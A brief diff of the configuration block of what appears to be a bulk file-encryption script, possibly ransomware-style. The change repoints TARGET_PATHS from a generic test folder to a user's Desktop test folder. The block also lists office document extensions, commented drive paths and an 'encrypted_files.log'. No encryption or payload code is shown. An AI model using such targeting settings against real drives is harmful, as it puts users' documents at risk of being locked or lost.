@@ -8,7 +8,7 @@ TARGET_EXTENSION = ['.txt', '.docx', '.pdf', '.xls']
 #     "D:/",
 # ]
 
-TARGET_PATHS = r"C:\test"
+TARGET_PATHS = r"C:\Users\ymoha\Desktop\test"
 
 LOG_FILE = 'encrypted_files.log'
 
